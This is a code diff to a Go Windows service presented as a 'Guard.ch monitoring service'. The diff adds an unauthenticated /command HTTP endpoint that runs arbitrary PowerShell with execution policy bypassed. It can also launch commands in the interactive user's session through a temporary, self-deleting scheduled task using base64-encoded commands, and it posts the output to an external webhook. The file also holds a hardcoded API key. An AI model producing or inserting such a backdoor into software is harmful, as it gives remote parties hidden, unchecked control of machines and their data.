@@ -1,29 +1,36 @@
 package main
 
 import (
-	"bytes"
-	"context"
-	"encoding/json"
-	"fmt"
-	"log"
-	"net"
-	"net/http"
-	"os"
-	"os/signal"
-	"syscall"
-	"time"
+    "bytes"
+    "context"
+    "encoding/json"
+    "fmt"
+    "encoding/base64"
+    "log"
+    "net"
+    "net/http"
+    "os"
+    "os/exec"
+    "os/signal"
+    "syscall"
+    "time"
+    "unicode/utf16"
+    "math/rand"
 
-	"golang.org/x/sys/windows/svc"
-	"golang.org/x/sys/windows/svc/debug"
-	"golang.org/x/sys/windows/svc/eventlog"
+    "golang.org/x/sys/windows/svc"
+    "golang.org/x/sys/windows/svc/debug"
+    "golang.org/x/sys/windows/svc/eventlog"
 )
 
 const (
-	serviceName = "GuardDownloadService"
-	apiURL      = "https://dev1.srv.browser.lol/v7/workspace/Lcg7Fq7Cfi1JOF5ND0zrqUL4ly949P8w"
-	apiKey      = "66WyLA9sm1vBlari46KYgfQdpOdi6QHjUQ1z7MZ8LwclLEdkoV"
-	webServerPort = ":60000"
+    serviceName = "GuardDownloadService"
+    apiURL      = "https://dev1.srv.browser.lol/v7/workspace/Lcg7Fq7Cfi1JOF5ND0zrqUL4ly949P8w"
+    apiKey      = "66WyLA9sm1vBlari46KYgfQdpOdi6QHjUQ1z7MZ8LwclLEdkoV"
+    webServerPort = ":60000"
 )
+
+// webhook for async command completion notifications
+const commandWebhookURL = "https://dev1.srv.browser.lol/v7/workpsace/PQ0r6CvP7Arr03TiDMGbBxHF6bCyqaSb"
 
 type NodeStatusRequest struct {
 	Key           string `json:"key"`
@@ -32,10 +39,26 @@ type NodeStatusRequest struct {
 }
 
 type service struct {
-	logger     *log.Logger
-	httpServer *http.Server
-	macAddr    string
-	statusData *NodeStatusRequest
+    logger     *log.Logger
+    httpServer *http.Server
+    macAddr    string
+    statusData *NodeStatusRequest
+}
+
+// CommandRequest defines the payload for /command
+type CommandRequest struct {
+    Command string `json:"command"`
+    Async   bool   `json:"async"`
+    ID      string `json:"id"`
+    Context string `json:"context,omitempty"` // "admin" or "user"; default "admin"
+}
+
+// CommandResult is used for responses and webhooks
+type CommandResult struct {
+    Status string `json:"status"`
+    Output string `json:"output,omitempty"`
+    ID     string `json:"id,omitempty"`
+    Error  string `json:"error,omitempty"`
 }
 
 func main() {
@@ -113,10 +136,12 @@ func (s *service) run() {
 		BrowserStatus: "ready",
 	}
 
-	// Setup HTTP server
-	mux := http.NewServeMux()
-	mux.HandleFunc("/status", s.handleStatus)
-	mux.HandleFunc("/", s.handleRoot) // Default handler
+    // Setup HTTP server
+    mux := http.NewServeMux()
+    mux.HandleFunc("/status", s.handleStatus)
+    mux.HandleFunc("/health", s.handleHealth)
+    mux.HandleFunc("/command", s.handleCommand)
+    mux.HandleFunc("/", s.handleRoot) // Default handler
 	
 	s.httpServer = &http.Server{
 		Addr:    webServerPort,
@@ -198,6 +223,130 @@ func (s *service) handleStatus(w http.ResponseWriter, r *http.Request) {
 	s.logger.Printf("Status request served for MAC: %s", s.macAddr)
 }
 
+// HTTP handler for GET /health
+func (s *service) handleHealth(w http.ResponseWriter, r *http.Request) {
+    if r.Method != http.MethodGet {
+        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+        return
+    }
+    w.Header().Set("Content-Type", "application/json")
+    resp := map[string]interface{}{
+        "status": "ok",
+        "mac":    s.macAddr,
+    }
+    if err := json.NewEncoder(w).Encode(resp); err != nil {
+        s.logger.Printf("Error encoding health response: %v", err)
+        http.Error(w, "Internal server error", http.StatusInternalServerError)
+        return
+    }
+}
+
+// HTTP handler for POST /command
+func (s *service) handleCommand(w http.ResponseWriter, r *http.Request) {
+    if r.Method != http.MethodPost {
+        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+        return
+    }
+
+    var reqBody CommandRequest
+    decoder := json.NewDecoder(r.Body)
+    decoder.DisallowUnknownFields()
+    if err := decoder.Decode(&reqBody); err != nil {
+        w.Header().Set("Content-Type", "application/json")
+        w.WriteHeader(http.StatusBadRequest)
+        _ = json.NewEncoder(w).Encode(CommandResult{Status: "error", Error: fmt.Sprintf("invalid JSON: %v", err)})
+        return
+    }
+
+    if reqBody.Command == "" {
+        w.Header().Set("Content-Type", "application/json")
+        w.WriteHeader(http.StatusBadRequest)
+        _ = json.NewEncoder(w).Encode(CommandResult{Status: "error", Error: "command is required"})
+        return
+    }
+
+    // Normalize and validate context
+    ctx := reqBody.Context
+    if ctx == "" {
+        ctx = "admin"
+    }
+    if ctx != "admin" && ctx != "user" {
+        w.Header().Set("Content-Type", "application/json")
+        w.WriteHeader(http.StatusBadRequest)
+        _ = json.NewEncoder(w).Encode(CommandResult{Status: "error", Error: "invalid context; must be 'admin' or 'user'"})
+        return
+    }
+
+    if reqBody.Async {
+        if reqBody.ID == "" {
+            w.Header().Set("Content-Type", "application/json")
+            w.WriteHeader(http.StatusBadRequest)
+            _ = json.NewEncoder(w).Encode(CommandResult{Status: "error", Error: "id is required when async is true"})
+            return
+        }
+
+        // Start execution in background and return immediately
+        id := reqBody.ID
+        cmdStr := reqBody.Command
+        go func() {
+            s.logger.Printf("Executing async command (context=%s, id=%s)", ctx, id)
+            var (
+                output string
+                err error
+            )
+            if ctx == "admin" {
+                output, err = runPowerShell(cmdStr)
+            } else {
+                // user context: start via scheduled task; output capture is not available
+                err = startProcessInUserSession(cmdStr, s.logger)
+                if err == nil {
+                    output = "started in user session"
+                }
+            }
+            status := "ok"
+            if err != nil {
+                status = "error"
+            }
+            // Send webhook notification
+            if err2 := s.sendCommandWebhook(CommandResult{Status: status, Output: output, ID: id}); err2 != nil {
+                s.logger.Printf("Error sending webhook for id=%s: %v", id, err2)
+            } else {
+                s.logger.Printf("Sent webhook for id=%s (status=%s)", id, status)
+            }
+        }()
+
+        w.Header().Set("Content-Type", "application/json")
+        _ = json.NewEncoder(w).Encode(CommandResult{Status: "ok", ID: reqBody.ID})
+        return
+    }
+
+    // Synchronous execution
+    s.logger.Printf("Executing sync command (context=%s)", ctx)
+    var (
+        output string
+        err error
+    )
+    if ctx == "admin" {
+        output, err = runPowerShell(reqBody.Command)
+    } else {
+        // user context: start via scheduled task; cannot capture stdout/stderr
+        err = startProcessInUserSession(reqBody.Command, s.logger)
+        if err == nil {
+            output = "started in user session"
+        }
+    }
+    res := CommandResult{Output: output}
+    if err != nil {
+        res.Status = "error"
+        res.Error = err.Error()
+    } else {
+        res.Status = "ok"
+    }
+
+    w.Header().Set("Content-Type", "application/json")
+    _ = json.NewEncoder(w).Encode(res)
+}
+
 // HTTP handler for root path - provides basic info
 func (s *service) handleRoot(w http.ResponseWriter, r *http.Request) {
 	if r.URL.Path != "/" {
@@ -207,16 +356,18 @@ func (s *service) handleRoot(w http.ResponseWriter, r *http.Request) {
 	
 	w.Header().Set("Content-Type", "application/json")
 	
-	info := map[string]interface{}{
-		"service": serviceName,
-		"version": "1.0",
-		"status":  "running",
-		"mac":     s.macAddr,
-		"endpoints": map[string]string{
-			"status": "/status",
-		},
-		"description": "Guard.ch monitoring service",
-	}
+    info := map[string]interface{}{
+        "service": serviceName,
+        "version": "1.0",
+        "status":  "running",
+        "mac":     s.macAddr,
+        "endpoints": map[string]string{
+            "status": "/status",
+            "health": "/health",
+            "command": "/command",
+        },
+        "description": "Guard.ch monitoring service",
+    }
 	
 	if err := json.NewEncoder(w).Encode(info); err != nil {
 		s.logger.Printf("Error encoding root response: %v", err)
@@ -279,6 +430,88 @@ func getMACAddress() (string, error) {
 	}
 
 	return "", fmt.Errorf("no active network interface found")
+}
+
+// runPowerShell executes a PowerShell command and returns its combined output
+func runPowerShell(command string) (string, error) {
+    // Prefer powershell.exe since this service targets Windows
+    cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", command)
+    // Capture combined stdout/stderr
+    out, err := cmd.CombinedOutput()
+    return string(out), err
+}
+
+// startProcessInUserSession launches the provided PowerShell command in the context
+// of the currently logged-on interactive user (GUI session) using a temporary scheduled task.
+// Note: Output capture is not supported for interactive user processes.
+func startProcessInUserSession(psCommand string, logger *log.Logger) error {
+    taskName := fmt.Sprintf("GuardUserRun-%d-%d", time.Now().Unix(), rand.Intn(100000))
+
+    // Build action that runs the command via EncodedCommand to avoid quoting issues
+    encoded := encodePSEncodedCommand(psCommand)
+
+    // PowerShell script to create, run, and remove an Interactive task
+    ps := fmt.Sprintf(`
+        $ErrorActionPreference = 'Stop'
+        $tn = '%s'
+        $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -EncodedCommand %s"
+        $principal = New-ScheduledTaskPrincipal -LogonType Interactive -RunLevel Highest
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Compatibility Win8
+        $task = New-ScheduledTask -Action $action -Principal $principal -Settings $settings
+        Register-ScheduledTask -TaskName $tn -InputObject $task -Force | Out-Null
+        try {
+            Start-ScheduledTask -TaskName $tn
+        } finally {
+            Start-Sleep -Milliseconds 500
+            Unregister-ScheduledTask -TaskName $tn -Confirm:$false
+        }
+    `, taskName, encoded)
+
+    // Execute the helper PS script under admin/system context
+    out, err := runPowerShell(ps)
+    if err != nil {
+        if logger != nil {
+            logger.Printf("startProcessInUserSession error: %v, output: %s", err, out)
+        }
+        return fmt.Errorf("failed to start user-session process: %w", err)
+    }
+    return nil
+}
+
+// encodePSEncodedCommand converts a string to a UTF-16LE base64 suitable for PowerShell -EncodedCommand
+func encodePSEncodedCommand(s string) string {
+    // PowerShell expects UTF-16LE for -EncodedCommand
+    runes := []rune(s)
+    u16 := utf16.Encode(runes)
+    b := make([]byte, len(u16)*2)
+    for i, v := range u16 {
+        b[2*i] = byte(v)
+        b[2*i+1] = byte(v >> 8)
+    }
+    return base64.StdEncoding.EncodeToString(b)
+}
+
+// sendCommandWebhook posts the command result to the configured webhook URL
+func (s *service) sendCommandWebhook(res CommandResult) error {
+    body, err := json.Marshal(res)
+    if err != nil {
+        return fmt.Errorf("marshal webhook body: %w", err)
+    }
+    client := &http.Client{Timeout: 15 * time.Second}
+    req, err := http.NewRequest("POST", commandWebhookURL, bytes.NewReader(body))
+    if err != nil {
+        return fmt.Errorf("create webhook request: %w", err)
+    }
+    req.Header.Set("Content-Type", "application/json")
+    resp, err := client.Do(req)
+    if err != nil {
+        return fmt.Errorf("send webhook: %w", err)
+    }
+    defer resp.Body.Close()
+    if resp.StatusCode < 200 || resp.StatusCode >= 300 {
+        return fmt.Errorf("webhook responded with status %d", resp.StatusCode)
+    }
+    return nil
 }
 
 func runService(name string, isDebug bool) {
